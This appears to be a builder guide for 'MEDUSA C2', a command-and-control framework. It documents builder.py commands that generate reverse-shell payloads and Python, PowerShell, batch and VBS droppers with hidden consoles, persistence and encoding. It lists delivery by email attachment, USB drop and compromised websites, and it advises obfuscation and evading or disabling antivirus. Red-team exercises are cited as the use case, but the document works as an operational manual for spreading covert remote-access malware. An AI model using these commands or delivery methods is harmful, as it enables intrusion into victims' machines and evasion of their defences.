# MEDUSA C2 Framework - Builder Guide

## Overview

The MEDUSA Builder generates custom payloads and executables for deployment.

## Payload Types

| Type | Description | File Extension |
|------|-------------|----------------|
| Python | Full-featured client with EXE compilation | .py, .exe |
| Netcat | Lightweight reverse shell commands | N/A |
| PowerShell | Windows PowerShell-based payload | .ps1 |
| Batch | Windows batch file dropper | .bat |
| VBS | VBScript dropper | .vbs |

## Web Interface Builder

### Payload Types

1. **Python Executable**: Full-featured client with EXE compilation
2. **Netcat Reverse Shell**: Lightweight shell commands
3. **PowerShell Script**: Windows PowerShell-based payload
4. **Batch Dropper**: Windows batch file dropper
5. **VBS Dropper**: VBScript dropper

### Payload Modes (Python Executable)

| Mode | Description | Use Case |
|------|-------------|----------|
| Silent | ✅ Completely hidden operation<br>✅ No console window<br>✅ Background execution | Red team exercises, stealth testing |
| Stealth | ✅ Enhanced hiding features<br>✅ Process priority management<br>✅ Advanced evasion | Advanced penetration testing |
| Basic | ✅ Standard executable<br>✅ Visible console (debugging)<br>✅ Simple deployment | Development, debugging |

## Command Line Builder

### Installation

```bash
# Install PyInstaller for EXE building
pip install pyinstaller

# Optional: Install UPX for compression
# Download from https://upx.github.io/
```

### Usage Examples

```bash
# Generate Python client with EXE
python builder.py --type python --ip 192.168.1.100 --port 4444 --output myclient --build-exe --hide-console

# Generate with persistence
python builder.py --type python --ip 192.168.1.100 --port 4444 --output myclient --build-exe --hide-console --persistence

# Generate PowerShell payload
python builder.py --type powershell --ip 192.168.1.100 --port 4444 --output psrevshell

# Generate encoded PowerShell
python builder.py --type powershell --ip 192.168.1.100 --port 4444 --output psrevshell --encode

# Generate Netcat commands
python builder.py --type netcat --ip 192.168.1.100 --port 4444

# Generate Batch dropper
python builder.py --type batch --ip 192.168.1.100 --port 4444 --output dropper

# Generate VBS dropper
python builder.py --type vbs --ip 192.168.1.100 --port 4444 --output dropper

# Test all builder functions
python builder.py --test
```

### Command Line Options

#### Required Arguments

| Option | Description |
|--------|-------------|
| `--type {python,netcat,powershell,batch,vbs}` | Payload type |
| `--ip IP_ADDRESS` | Server IP address |
| `--port PORT` | Server port number |

#### Optional Arguments

| Option | Description |
|--------|-------------|
| `--output NAME` | Output filename (default: client) |
| `--build-exe` | Build executable with PyInstaller |
| `--hide-console` | Hide console window |
| `--persistence` | Add persistence mechanisms |
| `--encode` | Base64 encode payload (PowerShell) |
| `--icon ICON_FILE` | Icon file for executable |
| `--test` | Test all builder functions |

## Generated Files

### File Structure

```
nova/payloads/
├── client.py              # Python source code
├── client.exe             # Compiled executable
├── psrevshell.ps1         # PowerShell script
├── dropper.bat            # Batch dropper
├── dropper.vbs            # VBS dropper
└── payload_info_*.json    # Generation metadata
```

## Deployment Methods

1. **Direct Execution**: Copy and run executable
2. **Email Attachment**: Social engineering vector
3. **USB Drop**: Physical deployment
4. **Web Download**: Host on compromised website
5. **Script Execution**: PowerShell/batch scripts
6. **Dropper Files**: Batch/VBS droppers for stealth deployment

## Builder Menu (Windows)

The `builder_menu.bat` script provides a quick launcher for Windows with the following options:

1. Generate Python Client (with EXE)
2. Generate Netcat Commands
3. Generate PowerShell Script
4. Generate Batch Dropper
5. Generate VBS Dropper
6. Test Builder (all functions)
7. Help / Usage Guide

## Security Considerations

- Always use encrypted connections in production
- Test payloads in isolated environments
- Obfuscate payloads to avoid detection
- Use stealth modes for evasion
- Implement proper error handling

## Troubleshooting

### Common Issues

1. **PyInstaller not found**: Install with `pip install pyinstaller`
2. **Permission denied**: Run as administrator on Windows
3. **Antivirus interference**: Temporarily disable or use evasion techniques
4. **Network connectivity**: Verify IP and port configuration
5. **Python dependencies**: Ensure all requirements are installed

### Debug Mode

Enable debug logging for detailed information:

```bash
# Server debug mode
python server.py --debug

# Client debug mode
# Edit client.py and add:
import logging
logging.basicConfig(level=logging.DEBUG)
```